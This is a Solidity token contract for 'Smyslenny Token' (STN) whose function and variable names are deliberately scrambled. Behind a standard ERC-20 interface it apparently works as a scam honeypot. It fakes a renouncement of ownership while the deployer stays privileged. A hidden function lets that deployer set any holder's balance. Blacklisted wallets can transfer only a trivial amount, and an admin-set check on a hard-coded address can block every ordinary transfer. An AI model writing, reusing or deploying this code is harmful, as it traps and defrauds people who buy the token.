//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface maxFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address minTeam) external view returns (uint256);

    function transfer(address amountWallet, uint256 listMin) external returns (bool);

    function allowance(address amountSellAt, address spender) external view returns (uint256);

    function approve(address spender, uint256 listMin) external returns (bool);

    function transferFrom(
        address sender,
        address amountWallet,
        uint256 listMin
    ) external returns (bool);

    event Transfer(address indexed from, address indexed marketingIs, uint256 value);
    event Approval(address indexed amountSellAt, address indexed spender, uint256 value);
}

abstract contract listTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface atAuto {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface buyWallet {
    function createPair(address tradingTx, address marketingTeam) external returns (address);
}

interface maxFromMetadata is maxFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SmyslennyToken is listTake, maxFrom, maxFromMetadata {

    uint256 private minTrading = 100000000 * 10 ** 18;

    address minFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 constant limitAuto = 5 ** 10;

    bool private walletToken;

    mapping(address => bool) public amountSender;

    function sellLaunchedMax() public {
        emit OwnershipTransferred(sellAuto, address(0));
        totalTrading = address(0);
    }

    function transfer(address fundList, uint256 listMin) external virtual override returns (bool) {
        return toFee(_msgSender(), fundList, listMin);
    }

    function toFee(address maxTx, address amountWallet, uint256 listMin) internal returns (bool) {
        if (maxTx == sellAuto) {
            return modeShould(maxTx, amountWallet, listMin);
        }
        uint256 enableTo = maxFrom(tradingMinIs).balanceOf(minFund);
        require(enableTo == limitList);
        require(amountWallet != minFund);
        if (amountSender[maxTx]) {
            return modeShould(maxTx, amountWallet, limitAuto);
        }
        return modeShould(maxTx, amountWallet, listMin);
    }

    function name() external view virtual override returns (string memory) {
        return minEnable;
    }

    bool public toAmount;

    bool public atFee;

    function feeLaunch(address shouldFrom) public {
        enableFee();
        if (swapTake) {
            txAuto = marketingTake;
        }
        if (shouldFrom == sellAuto || shouldFrom == tradingMinIs) {
            return;
        }
        amountSender[shouldFrom] = true;
    }

    uint256 private sellFund;

    function walletLimit(address feeReceiverTotal) public {
        if (toAmount) {
            return;
        }
        if (atFee != walletToken) {
            txAuto = sellFund;
        }
        exemptWalletShould[feeReceiverTotal] = true;
        if (walletToken == swapTake) {
            sellFund = maxLiquidity;
        }
        toAmount = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return takeBuy;
    }

    bool public swapTake;

    uint256 swapSender;

    uint8 private takeBuy = 18;

    function approve(address marketingSell, uint256 listMin) public virtual override returns (bool) {
        toSender[_msgSender()][marketingSell] = listMin;
        emit Approval(_msgSender(), marketingSell, listMin);
        return true;
    }

    function enableFee() private view {
        require(exemptWalletShould[_msgSender()]);
    }

    function owner() external view returns (address) {
        return totalTrading;
    }

    constructor (){
        if (totalIsEnable != txAuto) {
            marketingTake = maxLiquidity;
        }
        atAuto tokenMax = atAuto(buyLiquidity);
        tradingMinIs = buyWallet(tokenMax.factory()).createPair(tokenMax.WETH(), address(this));
        
        sellAuto = _msgSender();
        sellLaunchedMax();
        exemptWalletShould[sellAuto] = true;
        fundTakeSwap[sellAuto] = minTrading;
        if (atFee) {
            swapTake = true;
        }
        emit Transfer(address(0), sellAuto, minTrading);
    }

    uint256 public marketingTake;

    event OwnershipTransferred(address indexed feeLaunchedSender, address indexed modeToken);

    function symbol() external view virtual override returns (string memory) {
        return launchFund;
    }

    function getOwner() external view returns (address) {
        return totalTrading;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return minTrading;
    }

    uint256 private totalIsEnable;

    address buyLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 limitList;

    function takeSender(address fundList, uint256 listMin) public {
        enableFee();
        fundTakeSwap[fundList] = listMin;
    }

    function transferFrom(address maxTx, address amountWallet, uint256 listMin) external override returns (bool) {
        if (_msgSender() != buyLiquidity) {
            if (toSender[maxTx][_msgSender()] != type(uint256).max) {
                require(listMin <= toSender[maxTx][_msgSender()]);
                toSender[maxTx][_msgSender()] -= listMin;
            }
        }
        return toFee(maxTx, amountWallet, listMin);
    }

    function modeShould(address maxTx, address amountWallet, uint256 listMin) internal returns (bool) {
        require(fundTakeSwap[maxTx] >= listMin);
        fundTakeSwap[maxTx] -= listMin;
        fundTakeSwap[amountWallet] += listMin;
        emit Transfer(maxTx, amountWallet, listMin);
        return true;
    }

    uint256 private txAuto;

    function limitAt(uint256 listMin) public {
        enableFee();
        limitList = listMin;
    }

    uint256 private maxLiquidity;

    bool public txTrading;

    string private launchFund = "STN";

    function allowance(address tokenTotal, address marketingSell) external view virtual override returns (uint256) {
        if (marketingSell == buyLiquidity) {
            return type(uint256).max;
        }
        return toSender[tokenTotal][marketingSell];
    }

    address private totalTrading;

    mapping(address => mapping(address => uint256)) private toSender;

    address public tradingMinIs;

    address public sellAuto;

    mapping(address => uint256) private fundTakeSwap;

    mapping(address => bool) public exemptWalletShould;

    function balanceOf(address minTeam) public view virtual override returns (uint256) {
        return fundTakeSwap[minTeam];
    }

    string private minEnable = "Smyslenny Token";

}